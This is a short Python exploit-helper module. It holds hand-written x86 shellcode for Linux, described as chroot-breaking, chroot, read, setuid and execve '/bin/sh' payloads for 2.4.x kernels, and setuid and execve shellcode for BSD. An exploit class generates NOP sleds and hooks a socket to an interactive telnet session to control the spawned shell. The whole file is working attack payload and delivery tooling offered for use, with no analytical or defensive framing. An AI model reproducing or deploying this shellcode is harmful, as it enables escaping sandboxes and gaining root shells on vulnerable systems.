#!/usr/bin/python
import select,sys,telnetlib

class linux_shellcode:

  # 90 byte chroot breaking shellcode (for 2.4.x kernels)
  nchroot = \
    "\x31\xdb\x8d\x43\x17\xcd\x80\x31\xd2\x52\x8d\x42\x3d" \
    "\xcd\x80\x31\xf6\x52\x66\x68\x2e\x2e\x89\xe3\x8d\x42" \
    "\x0c\xcd\x80\x52\x6a\x2e\x89\xe3\x83\xec\x58\x89\xe1" \
    "\x8d\x42\x6a\xcd\x80\x8b\x79\x04\x83\xff\x02\x74\x06" \
    "\x46\x83\xfe\x64\x7c\xd7\x52\x6a\x2e\x89\xe3\x8d\x42" \
    "\x3d\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
    "\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

  # 52 byte chroot shellcode
  chroot = \
    "\x31\xd2\x52\x6a\x41\x89\xe3\x66\xb9\xed\x01\x8d\x42" \
    "\x27\xcd\x80\x8d\x42\x3d\xcd\x80\x31\xf6\x52\x68\x2e" \
    "\x2e\x2f\x2f\x46\x83\xfe\x10\x7c\xf5\x89\xe3\x8d\x42" \
    "\x3d\xcd\x80\x52\x6a\x41\x89\xe3\x8d\x42\x28\xcd\x80"
  
  # 17 byte read shellcode
  read = \
    "\x33\xdb\xf7\xe3\xb0\x03\x8b\xcc\x68\xb2\xff\xcd\x80" \
    "\xff\xe4\xeb\xec"

  # 7 byte setuid shellcode
  setuid = \
    "\x31\xdb\x8d\x43\x17\xcd\x80"

  # 24 byte execve shellcode
  execve = \
    "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" \
    "\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

class bsd_shellcode:

  # 8 byte setuid shellcode
  setuid = \
    "\x31\xc0\x50\x50\xb0\x17\xcd\x80"

  # 23 byte execve shellcode
  execve = \
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" \
    "\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"

class exploit:

  def nops(self, size):
    return "\x90" * size

  def shell(self, sockfd):
    telnet = telnetlib.Telnet()
    telnet.sock = sockfd
    telnet.interact()
